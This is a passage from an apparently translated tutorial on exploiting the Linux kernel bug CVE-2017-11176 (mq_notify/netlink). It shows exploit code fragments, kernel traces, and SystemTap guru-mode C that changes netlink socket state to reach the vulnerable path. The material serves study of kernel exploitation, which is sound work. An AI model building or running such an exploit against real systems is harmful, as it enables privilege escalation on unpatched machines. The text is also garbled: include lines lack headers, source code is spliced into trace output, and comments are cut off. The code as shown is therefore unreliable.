    (18771-18771) [skb] > fget (fd=0xffffffff)                         // f_path.dentry->d_inode;
          struct sock *sock;
          if (!S_ISSOCK(inode->i_mode))         // sk;
          if (sock->sk_family != AF_NETLINK)    // 
        #include 
        #include 
        #include 
        #include 
        #include 
        #include 
        #include 
        #define NOTIFY_COOKIE_LEN (32)
        #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
        #define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
        int main(void)
        {
          struct sigevent sigev;
          char sival_buffer[NOTIFY_COOKIE_LEN];
          int sock_fd;
          printf("-={ CVE-2017-11176 Exploit }=-\n");
          if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) > mq_notify (-1, 0x7ffce9cf2180)
    (18998-18998) [uland] ==>> copy_from_user ()
    (18998-18998) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
    (18998-18998) [uland] ==>> copy_from_user ()
    (18998-18998) [skb] ==>> skb_put (skb=0xffff88003d1e0480 len=0x20)
    (18998-18998) [skb] > fget (fd=0x3)                                          // > netlink_getsockbyfilp (filp=0xffff88003cf14d80)
    (18998-18998) [netlink] > netlink_attachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480 timeo=0xffff88003df8ff40 ssk=0x0)
    (18998-18998) [netlink] > fget (fd=0xffffffff)
    (18998-18998) [vfs] > netlink_detachskb (sk=0xffff88002ff60000 skb=0xffff88003d1e0480)
    (18998-18998) [netlink] sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {
            DECLARE_WAITQUEUE(wait, current);
            if (!*timeo) {
              // ... cut (never reached in our code path) ...
            }
            __set_current_state(TASK_INTERRUPTIBLE);
            add_wait_queue(&nlk->wait, &wait);
            if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) &&
                !sock_flag(sk, SOCK_DEAD))
              *timeo = schedule_timeout(*timeo);
            __set_current_state(TASK_RUNNING);
            remove_wait_queue(&nlk->wait, &wait);
            sock_put(sk);
            if (signal_pending(current)) {
              kfree_skb(skb);
              return sock_intr_errno(*timeo);
            }
            return 1;                             // sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))
是时候释放System
Tap的真正力量并进入:Guru模式！Guru模式可以编写由探针调用的嵌入“C”代码。就像直接编写将在运行时注入的内核代码，就像Linux内核模块(LKM)一样。因此，这里的任何编程错误都会导致内核崩溃！您现在是内核开发人员:-)。
这里要做的是修改 _struct sock "sk"_ 和/或 _struct netlink_sock "nlk"_
数据结构，让条件成真。但是，在执行此操作之前，让我们获取一些有关当前 _struct sock_ **sk** 状态的有用信息。
修改 _netlink_attachskb()_ 探针并添加一些"嵌入"C代码（“％{”和“％}”部分）。
    %{
        #include 
        #include 
        %}
        function dump_netlink_sock:long (arg_sock:long)
        %{
          struct sock *sk = (void*) STAP_ARG_arg_sock;
          struct netlink_sock *nlk = (void*) sk;
          _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
          _stp_printf("- sk = %p\n", sk);
          _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
          _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
          _stp_printf("- sk->sk_refcnt = %d\n", sk->sk_refcnt);
          _stp_printf("- nlk->state = %x\n", (nlk->state & 0x1));
          _stp_printf("-={ dump_netlink_sock: END}=-\n");
        %}
        probe kernel.function ("netlink_attachskb")
        {
          if (execname() == "exploit")
          {
            printf("(%d-%d) [netlink] ==>> netlink_attachskb (%s)\n", pid(), tid(), $$parms)
            dump_netlink_sock($sk);
          }
        }
**WARNING** :同样，这里的代码在内核态下运行，任何错误都会导致内核崩溃。
使用 **-g** （即guru）修饰符运行system tap：
    -={ CVE-2017-11176 Exploit }=-    netlink socket created = 3
    mq_notify: Bad file descriptor
    exploit failed!
    (19681-19681) [SYSCALL] ==>> mq_notify (-1, 0x7ffebaa7e720)
    (19681-19681) [uland] ==>> copy_from_user ()
    (19681-19681) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
    (19681-19681) [uland] ==>> copy_from_user ()
    (19681-19681) [skb] ==>> skb_put (skb=0xffff88003d1e05c0 len=0x20)
    (19681-19681) [skb] > fget (fd=0x3)
    (19681-19681) [vfs] > netlink_getsockbyfilp (filp=0xffff88003d0d5680)
    (19681-19681) [netlink] > netlink_attachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0 timeo=0xffff88003df5bf40 ssk=0x0)
    -={ dump_netlink_sock: 0xffff880036256800 }=-    - sk = 0xffff880036256800
    - sk->sk_rmem_alloc = 0         // sk_rcvbuf = 133120        // sk_refcnt = 2
    - nlk->state = 0                // > fget (fd=0xffffffff)
    (19681-19681) [vfs] > netlink_detachskb (sk=0xffff880036256800 skb=0xffff88003d1e05c0)
    (19681-19681) [netlink] state的第一个比特位未设置，sk_rmem_alloc小于sk_rcvbuf
...所以我们并没有满足条件。
在调用netlink_attachskb()之前,修改nlk->state：
    function dump_netlink_sock:long (arg_sock:long)
        %{
          struct sock *sk = (void*) STAP_ARG_arg_sock;
          struct netlink_sock *nlk = (void*) sk;
          _stp_printf("-={ dump_netlink_sock: %p }=-\n", nlk);
          _stp_printf("- sk = %p\n", sk);
          _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
          _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
          _stp_printf("- sk->sk_refcnt = %d\n", sk->sk_refcnt);
          _stp_printf("- (before) nlk->state = %x\n", (nlk->state & 0x1));
          nlk->state |= 1;                                                  // state = %x\n", (nlk->state & 0x1));
          _stp_printf("-={ dump_netlink_sock: END}=-\n");
        %}
再次运行：
    -={ CVE-2017-11176 Exploit }=-    netlink socket created = 3
    >>
    ^Cmake: *** [check] Interrupt
    (20002-20002) [SYSCALL] ==>> mq_notify (-1, 0x7ffc48bed2c0)
    (20002-20002) [uland] ==>> copy_from_user ()
    (20002-20002) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
    (20002-20002) [uland] ==>> copy_from_user ()
    (20002-20002) [skb] ==>> skb_put (skb=0xffff88003d3a6080 len=0x20)
    (20002-20002) [skb] > fget (fd=0x3)